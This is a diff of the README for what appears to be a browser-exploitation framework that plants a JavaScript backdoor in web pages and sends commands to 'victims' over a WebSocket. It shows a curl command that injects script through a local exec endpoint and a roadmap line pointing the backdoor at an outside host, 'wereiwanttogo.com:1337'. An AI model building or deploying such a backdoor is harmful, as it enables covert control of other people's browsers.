@@ -28,7 +28,7 @@ A framework for exploiting browsers by injecting Javascript to a web-based backd
 <pre>curl 'http://localhost:1337/exec?alert("muahahahaha")'</pre>
 
 # TODO & Roadmap
-- if necessairy ask to clean port (if something is running on it, maybe pinpoint it)
+- if necessairy ask to clean port (if something is running on it, maybe pinpoint it) (maybe make bash script starter that checks this?)
 - (DONE) For testing, if the servers root is requested, return the backdoor.html file
 - backdoor must be built to only provide the URL to connect to if it was not already set. so that the url can be changed by adding an extra script-segment with "var socket = new WebSocket('ws://wereiwanttogo.com:1337')"
 - (DONE) interface should take commands to be sent to victims.
